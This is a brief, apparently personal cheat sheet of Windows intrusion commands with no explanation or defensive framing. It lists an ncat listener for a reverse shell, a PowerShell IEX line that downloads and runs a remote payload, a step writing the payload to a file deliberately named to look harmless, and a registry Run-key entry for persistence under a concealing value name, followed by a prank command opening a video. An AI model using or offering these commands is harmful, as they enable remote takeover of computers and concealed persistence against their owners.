ncat -l -p 4444
powershell IEX (New-Object Net.WebClient).DownloadString('path_to_reverseshellpayload')
echo "payload" | Out-File -FilePath notsuspicious.ps1
add persistence once we gained access with the reverseshell : reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run \V NothingToSeeHere -d "C:\Windows\System32\notsuspicious.ps1" /F 

rickroll : start chrome https://youtu.be/dQw4w9WgXcQ -WindowStyle maximized
